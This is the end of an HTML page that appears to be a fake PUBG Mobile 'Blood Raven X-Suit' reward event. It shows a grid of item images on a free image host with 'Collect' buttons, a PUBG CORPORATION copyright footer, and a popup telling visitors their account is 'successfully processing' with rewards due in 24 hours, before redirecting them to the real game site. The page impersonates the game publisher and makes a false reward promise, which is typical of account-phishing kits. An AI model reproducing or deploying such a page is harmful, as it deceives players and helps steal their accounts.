</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/5x1w88X/28.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/5x1w88X/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/R0rQvw4/29.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/R0rQvw4/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/27fMpPf/30.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/27fMpPf/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cTcRJCZ/31.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cTcRJCZ/31.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WPFTmgN/32.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WPFTmgN/32.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0h8n8jN/33.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0h8n8jN/33.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3WdQMkQ/34.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3WdQMkQ/34.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n6KkVTX/35.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n6KkVTX/35.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pWR4WQ1/36.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pWR4WQ1/36.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/6DmJkWp/37.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/6DmJkWp/37.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sT1w13/38.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9sT1w13/38.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQtBL6z/39.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PQtBL6z/39.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Gk99ZQY/40.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Gk99ZQY/40.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/P44sdBP/41.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/P44sdBP/41.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0MhX7pL/42.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0MhX7pL/42.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6PYCWg/43.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c6PYCWg/43.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qsw53N6/44.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qsw53N6/44.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/rQ7NY9z/45.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/rQ7NY9z/45.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/X3CBhhv/46.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/X3CBhhv/46.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KLQY3Vg/47.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/KLQY3Vg/47.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nMmZ2Rc/48.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/nMmZ2Rc/48.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XS1D33m/49.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/XS1D33m/49.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PQNxt7B/50.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PQNxt7B/50.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</div> <!--- box --->
<div class="footer">
<img src="img/footer_img.png">
<div class="footer-txt">&copy; 2018-2021 PUBG CORPORATION. All rights reserved.</div>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="popup-content">
<br>
<div class="popup-rewards-title">
Thank your for joining this Blood Raven X-Suit event
<br>
<br>
Currently your account has been successfully processing
<br>
Please wait up to 24 hours to receive your rewards
</div>
</div>
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div>
</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>